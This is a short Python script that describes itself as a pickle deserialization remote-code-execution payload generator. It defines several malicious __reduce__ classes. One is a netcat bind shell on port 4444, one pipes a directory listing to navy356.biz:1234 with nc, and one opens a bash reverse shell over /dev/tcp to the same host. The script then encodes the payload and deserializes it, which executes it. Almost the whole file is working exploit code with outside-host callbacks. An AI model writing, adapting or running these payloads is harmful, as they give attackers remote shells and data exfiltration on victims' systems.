#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle
import sys
import base64
import os
import subprocess

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class RCE:
    def __reduce__(self):
        cmd = ('ls | nc navy356.biz 1234')
        return os.system, (cmd,)

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))


class Exploit(object):
    def __reduce__(self):
        return (eval, ("os.system('bash -c \"bash &>/dev/tcp/navy356.biz/1234 <&1\"')",))

class Exploit2(object):
    def __reduce__(self):
        return (subprocess.call,(["ls"],))

a=list()
a.append(Exploit())
b=base64.b64encode(pickle.dumps(a))
print(b)
print(pickle.loads(base64.b64decode(b)))